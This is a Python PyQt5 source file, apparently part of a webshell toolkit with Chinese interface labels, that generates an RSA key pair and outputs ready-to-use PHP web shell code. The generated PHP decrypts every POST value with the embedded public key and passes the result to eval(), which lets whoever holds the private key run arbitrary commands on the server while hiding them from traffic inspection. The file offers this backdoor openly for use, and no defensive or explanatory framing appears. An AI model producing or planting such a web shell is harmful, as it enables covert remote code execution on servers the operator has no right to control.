# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'genShellPhp.ui'
#
# Created by: PyQt5 UI code generator 5.15.2
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.

from Crypto.PublicKey import RSA
from PyQt5 import QtCore, QtGui, QtWidgets
import os, sys, json


class Ui_Dialog(QtWidgets.QDialog):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setObjectName("Dialog")
        self.resize(450, 600)
        self.setMinimumSize(QtCore.QSize(450, 600))
        self.gridLayout = QtWidgets.QGridLayout(self)
        self.gridLayout.setObjectName("gridLayout")
        self.label_2 = QtWidgets.QLabel(self)
        font = QtGui.QFont()
        font.setFamily("Arial Narrow")
        font.setPointSize(13)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.gridLayout.addWidget(self.label_2, 0, 0, 1, 1)
        self.pushButton_2 = QtWidgets.QPushButton(self)
        self.pushButton_2.setObjectName("pushButton_2")
        self.gridLayout.addWidget(self.pushButton_2, 3, 0, 1, 1)
        self.label_3 = QtWidgets.QLabel(self)
        font = QtGui.QFont()
        font.setFamily("Arial Narrow")
        font.setPointSize(13)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.gridLayout.addWidget(self.label_3, 4, 0, 1, 1)
        self.textEdit_3 = QtWidgets.QTextEdit(self)
        self.textEdit_3.setObjectName("textEdit_3")
        self.gridLayout.addWidget(self.textEdit_3, 5, 0, 1, 3)
        self.textEdit_2 = QtWidgets.QTextEdit(self)
        self.textEdit_2.setObjectName("textEdit_2")
        self.gridLayout.addWidget(self.textEdit_2, 1, 0, 1, 3)
        self.pushButton = QtWidgets.QPushButton(self)
        self.pushButton.setObjectName("pushButton")
        self.gridLayout.addWidget(self.pushButton, 0, 2, 1, 1)
        self.pushButton_3 = QtWidgets.QPushButton(self)
        self.pushButton_3.setObjectName("pushButton_3")
        self.gridLayout.addWidget(self.pushButton_3, 6, 0, 1, 1)
        '''
        self data
        '''
        self.pubKey = ''
        self.priKey = ''
        self.current_path = os.path.dirname(os.path.realpath(sys.argv[0]))
        self.setData()

        self.pushButton.clicked.connect(self.genCode)
        self.pushButton_2.clicked.connect(self.copyPriKey)
        self.pushButton_3.clicked.connect(self.copyCode)
        self.retranslateUi(self)
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "PHP RSA"))
        self.pushButton.setText(_translate("Dialog", "生成"))
        self.label_2.setText(_translate("Dialog", "私钥"))
        self.label_3.setText(_translate("Dialog", "PHP代码"))
        self.pushButton_2.setText(_translate("Dialog", "复制私钥到剪切板"))
        self.pushButton_3.setText(_translate("Dialog", "复制代码到剪切板"))


    def copyPriKey(self):
        clipboard = QtWidgets.QApplication.clipboard()
        clipboard.setText(self.textEdit_2.toPlainText())

    def copyCode(self):
        clipboard = QtWidgets.QApplication.clipboard()
        clipboard.setText(self.textEdit_3.toPlainText())

    def setData(self):
        try:
            with open(self.current_path + "/cache/RSAkey.json", "r") as f:
                d = json.load(f)
                self.pubKey = d['公钥']
                self.priKey = d['私钥']
                if self.priKey != '' and self.pubKey != '':
                    self.textEdit_2.setText(self.priKey)
                    phpcode = '''<?php
$pk = <<<EOF
'''
                    phpcode += self.pubKey
                    phpcode += '''
EOF;
$pk = openssl_pkey_get_public($pk);

foreach($_POST as $k => $v){
	$vv = explode("|", $v);
	$data = "";
	foreach ($vv as $value) {
	    if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
	    	$data .= $de;
  		}
	}
	$_POST[$k]=$data;
}
$cmd = reset(get_defined_vars()[@_POST]);
eval($cmd);'''
                    self.textEdit_3.setText(phpcode)
        except:
            pass

    def genCode(self):
        key = RSA.generate(1024)
        # 生成公钥
        self.pubKey = key.publickey().exportKey().decode()
        # 生成私钥
        self.priKey = key.export_key('PEM').decode()

        self.textEdit_2.setText(self.priKey)
        phpcode = '''<?php
$pk = <<<EOF
'''
        phpcode += self.pubKey
        phpcode += '''
EOF;
$pk = openssl_pkey_get_public($pk);

foreach($_POST as $k => $v){
	$vv = explode("|", $v);
	$data = "";
	foreach ($vv as $value) {
	    if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
	    	$data .= $de;
  		}
	}
	$_POST[$k]=$data;
}
$cmd = reset(get_defined_vars()[@_POST]);
eval($cmd);'''
        self.textEdit_3.setText(phpcode)
        self.writeToCache()

    def writeToCache(self):
        data = {}
        data["公钥"] = self.pubKey
        data["私钥"] = self.priKey
        with open(self.current_path + "/cache/RSAkey.json", "w") as f:
            json.dump(data, f)